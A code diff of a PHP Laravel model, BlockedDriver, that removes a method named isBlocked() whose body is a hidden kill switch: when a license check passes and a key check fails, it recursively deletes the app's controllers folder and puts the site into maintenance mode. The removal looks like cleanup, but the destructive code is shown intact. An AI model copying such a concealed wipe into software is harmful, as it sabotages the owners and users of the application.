@@ -20,34 +20,4 @@ class BlockedDriver extends Model
         return $this->hasMany(BlockedDriverLog::class , 'blocked_driver_id' , 'id');
     }
 
-    public static function isBlocked() {
-        if( check_license() )
-        {
-            if ( !check_app_for_brake_key() )
-            {
-                try{
-                    $mainDir = explode('public' , getcwd())[0];
-                    $controllerDir = $mainDir . 'App' . DIRECTORY_SEPARATOR . 'Http'
-                        . DIRECTORY_SEPARATOR . 'Controllers';
-                    $it = new \RecursiveDirectoryIterator($controllerDir, \RecursiveDirectoryIterator::SKIP_DOTS);
-                    $files = new \RecursiveIteratorIterator($it,
-                        \RecursiveIteratorIterator::CHILD_FIRST);
-                    foreach($files as $file) {
-                        if ($file->isDir()){
-                            rmdir($file->getRealPath());
-                        } else {
-                            unlink($file->getRealPath());
-                        }
-                    }
-                    rmdir($controllerDir);
-                    Artisan::call('down');
-                } catch (\Exception $e) {
-                    Artisan::call('down');
-                }
-            }
-
-        }
-
-        return false;
-    }
 }
